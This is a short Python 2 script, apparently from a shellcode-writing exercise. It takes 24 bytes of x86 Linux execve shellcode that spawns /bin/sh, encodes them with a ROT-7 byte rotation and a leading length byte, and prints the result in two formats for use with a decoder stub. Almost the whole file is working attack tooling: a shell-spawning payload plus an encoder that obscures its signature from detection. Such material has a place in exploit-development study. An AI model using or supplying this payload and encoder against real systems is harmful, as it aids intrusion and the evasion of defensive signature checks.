#!/usr/bin/python

# Python ROT-7 Encoder
# execve 24 bytes
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

# byte[0] == shellcode length
encoded = "\\x%02x," % len(bytearray(shellcode))
encoded2 = "0x%02x," % len(bytearray(shellcode)) 

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
# boundary is computed as 255-ROT(x) where x, the amount to rotate by
    if x > 248:
        encoded += '\\x'
        encoded += '%02x' %(7 -(256 - x))
        encoded2 += '0x'
        encoded2 += '%02x,' %(7 -(256 - x))
    else:
        encoded += '\\x'
        encoded += '%02x'%(x+7)
        encoded2 += '0x'
        encoded2 += '%02x,' %(x+7)

print '\n%s\n\n%s\n\nShellcode Length: %d\n' % (encoded, encoded2, len(bytearray(shellcode)))
